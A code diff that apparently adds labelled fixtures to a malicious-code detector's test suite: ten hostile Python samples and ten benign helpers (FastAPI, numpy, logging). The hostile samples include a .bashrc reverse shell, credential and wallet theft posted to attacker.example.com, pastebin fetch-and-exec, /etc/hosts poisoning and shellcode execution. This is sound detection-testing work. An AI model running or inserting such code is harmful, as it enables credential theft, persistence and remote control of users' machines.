@@ -389,6 +389,342 @@ secret = n.environ.get("AWS_KEY")
 m.run(f"curl -d {secret} https://attacker.example.com", shell=True)
 '''},
     ),
+    # ─── 악성 fixture 추가 10 (60 fixture 목표) ───────────
+    _mal(
+        "ld-preload-injection",
+        description="LD_PRELOAD 환경변수 덮어쓰기 (Linux 후킹)",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="SYS-001",
+        files={"hook.py": '''
+import os, subprocess
+os.environ["LD_PRELOAD"] = "/tmp/malicious.so"
+subprocess.run(["bash", "-c", "echo hooked"])
+'''},
+    ),
+    _mal(
+        "bashrc-persistence",
+        description=".bashrc 에 reverse shell 추가",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="SYS-002",
+        files={"persist.py": '''
+import os
+home = os.path.expanduser("~")
+with open(home + "/.bashrc", "a") as f:
+    f.write('\\n(bash -i >& /dev/tcp/attacker.example.com/4444 0>&1) &\\n')
+'''},
+    ),
+    _mal(
+        "wallet-exfil",
+        description="암호화폐 지갑 파일 읽기 + 송신",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="SYS-003",
+        files={"wallet.py": '''
+import os, glob, requests
+for path in glob.glob(os.path.expanduser("~/.electrum/wallets/*")):
+    try:
+        with open(path, "rb") as f:
+            requests.post("https://attacker.example.com/wallets",
+                          files={"w": f.read()})
+    except Exception:
+        pass
+'''},
+    ),
+    _mal(
+        "creationflags-detached",
+        description="DETACHED_PROCESS subprocess flag (Windows hidden)",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="EXM-004",
+        files={"hide.py": '''
+import subprocess
+DETACHED_PROCESS = 0x00000008
+CREATE_NEW_PROCESS_GROUP = 0x00000200
+subprocess.Popen(
+    ["powershell.exe", "-c", "echo hidden"],
+    creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
+)
+'''},
+    ),
+    _mal(
+        "geo-ip-recon-and-send",
+        description="ipinfo.io 로 IP/지리 정보 수집 → 송신",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="NET-001 + EXF-001",
+        files={"recon.py": '''
+import requests, os
+geo = requests.get("https://ipinfo.io/json").json()
+geo["user"] = os.environ.get("USER")
+requests.post("https://attacker.example.com/geo", json=geo)
+'''},
+    ),
+    _mal(
+        "tor-onion-c2",
+        description=".onion C2 도메인 호출",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="EXF-005 (.onion)",
+        files={"c2.py": '''
+import requests
+requests.post(
+    "http://abcd1234efgh5678.onion/checkin",
+    json={"id": "victim-001", "status": "alive"},
+)
+'''},
+    ),
+    _mal(
+        "ctypes-shellcode",
+        description="ctypes 로 native binary 로드 + shellcode 실행",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="EXM-003",
+        files={"sc.py": '''
+import ctypes
+shellcode = b"\\x90" * 16 + b"\\xc3"
+buf = ctypes.create_string_buffer(shellcode)
+fn = ctypes.CFUNCTYPE(None)(ctypes.addressof(buf))
+fn()
+'''},
+    ),
+    _mal(
+        "pastebin-fetch-exec",
+        description="pastebin 에서 페이로드 다운 + exec",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="EXF-005 + EXM-001",
+        files={"pb.py": '''
+import requests
+r = requests.get("https://pastebin.com/raw/AbCdEfGh")
+exec(r.text)
+'''},
+    ),
+    _mal(
+        "etc-hosts-poison",
+        description="/etc/hosts 파일에 fake DNS 추가",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="SYS-009",
+        files={"poison.py": '''
+with open("/etc/hosts", "a") as f:
+    f.write("\\n6.6.6.6 google.com\\n6.6.6.6 github.com\\n")
+'''},
+    ),
+    _mal(
+        "credential-paths-multifile",
+        description="여러 credential 파일 동시 수집",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="credential-paths + EXF-001",
+        files={"creds.py": '''
+import os, requests
+home = os.path.expanduser("~")
+targets = [
+    home + "/.aws/credentials",
+    home + "/.docker/config.json",
+    home + "/.ssh/id_rsa",
+    home + "/.netrc",
+    home + "/.config/gcloud/credentials.db",
+]
+collected = {}
+for p in targets:
+    try:
+        with open(p) as f:
+            collected[p] = f.read()
+    except Exception:
+        pass
+requests.post("https://attacker.example.com/creds", json=collected)
+'''},
+    ),
+    # ─── 정상 fixture 추가 10 ───────────────────────────────
+    _ben(
+        "fastapi-style-app",
+        description="FastAPI 스타일 비동기 앱",
+        files={"main.py": '''
+"""FastAPI app."""
+from fastapi import FastAPI, HTTPException
+from pydantic import BaseModel
+
+app = FastAPI()
+
+class Item(BaseModel):
+    name: str
+    price: float
+
+@app.get("/items/{item_id}")
+async def read_item(item_id: int):
+    if item_id < 0:
+        raise HTTPException(status_code=400, detail="invalid id")
+    return {"item_id": item_id}
+
+@app.post("/items/")
+async def create_item(item: Item):
+    return item
+'''},
+    ),
+    _ben(
+        "numpy-array-ops",
+        description="numpy 행렬 연산",
+        files={"linalg.py": '''
+"""Linear algebra helpers."""
+import numpy as np
+
+def normalize(v):
+    norm = np.linalg.norm(v)
+    if norm == 0:
+        return v
+    return v / norm
+
+def cosine(a, b):
+    return float(np.dot(a, b) / (np.linalg.norm(a) * np.linalg.norm(b)))
+
+def softmax(x, axis=-1):
+    e = np.exp(x - np.max(x, axis=axis, keepdims=True))
+    return e / np.sum(e, axis=axis, keepdims=True)
+'''},
+    ),
+    _ben(
+        "dataclass-serializer",
+        description="dataclass JSON 직렬화 helper",
+        files={"serial.py": '''
+"""Dataclass <-> JSON helpers."""
+import dataclasses
+import json
+from typing import Any
+
+def to_dict(obj: Any) -> dict:
+    if dataclasses.is_dataclass(obj):
+        return dataclasses.asdict(obj)
+    raise TypeError(f"not a dataclass: {type(obj)}")
+
+def to_json(obj: Any, **kw) -> str:
+    return json.dumps(to_dict(obj), **kw)
+'''},
+    ),
+    _ben(
+        "logging-rotating-file",
+        description="rotating file handler 설정 (정상)",
+        files={"log_setup.py": '''
+"""Rotating file logger."""
+import logging
+import logging.handlers
+from pathlib import Path
+
+def setup(name: str, log_dir: str, level: int = logging.INFO):
+    Path(log_dir).mkdir(parents=True, exist_ok=True)
+    logger = logging.getLogger(name)
+    logger.setLevel(level)
+    handler = logging.handlers.RotatingFileHandler(
+        f"{log_dir}/{name}.log",
+        maxBytes=10 * 1024 * 1024, backupCount=5,
+    )
+    handler.setFormatter(logging.Formatter(
+        "%(asctime)s %(name)s %(levelname)s %(message)s"
+    ))
+    logger.addHandler(handler)
+    return logger
+'''},
+    ),
+    _ben(
+        "graphql-resolver-skeleton",
+        description="GraphQL resolver 골격",
+        files={"schema.py": '''
+"""GraphQL schema + resolvers."""
+from typing import List, Optional
+
+class User:
+    def __init__(self, id: int, name: str):
+        self.id = id
+        self.name = name
+
+USERS = [User(1, "Alice"), User(2, "Bob")]
+
+def resolve_user(parent, info, id: int) -> Optional[User]:
+    for u in USERS:
+        if u.id == id:
+            return u
+    return None
+
+def resolve_users(parent, info) -> List[User]:
+    return USERS
+'''},
+    ),
+    _ben(
+        "image-pillow-resize",
+        description="Pillow 로 이미지 리사이즈",
+        files={"image.py": '''
+"""Image resize helper."""
+from PIL import Image
+from pathlib import Path
+
+def resize(src: str, dst: str, size: tuple) -> None:
+    img = Image.open(src)
+    img.thumbnail(size, Image.LANCZOS)
+    img.save(dst)
+'''},
+    ),
+    _ben(
+        "regex-validator",
+        description="이메일/URL 정규식 validator",
+        files={"validators.py": '''
+"""Pattern-based validators."""
+import re
+
+EMAIL_RE = re.compile(r"^[\\w.+-]+@[\\w-]+\\.[\\w.-]+$")
+URL_RE = re.compile(r"^https?://[\\w.-]+(?:/[\\w./?=&%-]*)?$")
+
+def is_email(s: str) -> bool:
+    return bool(EMAIL_RE.match(s))
+
+def is_url(s: str) -> bool:
+    return bool(URL_RE.match(s))
+'''},
+    ),
+    _ben(
+        "concurrent-futures-pool",
+        description="ThreadPoolExecutor 워커 풀",
+        files={"pool.py": '''
+"""Thread pool wrapper."""
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+def map_parallel(fn, items, max_workers: int = 8):
+    with ThreadPoolExecutor(max_workers=max_workers) as ex:
+        futures = {ex.submit(fn, x): x for x in items}
+        for fut in as_completed(futures):
+            yield futures[fut], fut.result()
+'''},
+    ),
+    _ben(
+        "redis-cache-wrapper",
+        description="redis 캐싱 wrapper (정상)",
+        files={"cache.py": '''
+"""Redis-backed cache."""
+import json
+
+class Cache:
+    def __init__(self, client):
+        self.client = client
+
+    def get(self, key: str):
+        v = self.client.get(key)
+        return json.loads(v) if v else None
+
+    def set(self, key: str, value, ttl: int = 3600):
+        self.client.setex(key, ttl, json.dumps(value))
+'''},
+    ),
+    _ben(
+        "pytest-fixtures-tmpdir",
+        description="pytest tmpdir 사용 fixture",
+        files={"test_io.py": '''
+"""pytest tmp directory tests."""
+import pytest
+from pathlib import Path
+
+@pytest.fixture
+def workdir(tmp_path: Path) -> Path:
+    sub = tmp_path / "work"
+    sub.mkdir()
+    return sub
+
+def test_write_and_read(workdir):
+    f = workdir / "data.txt"
+    f.write_text("hello", encoding="utf-8")
+    assert f.read_text(encoding="utf-8") == "hello"
+'''},
+    ),
 ]
 
 
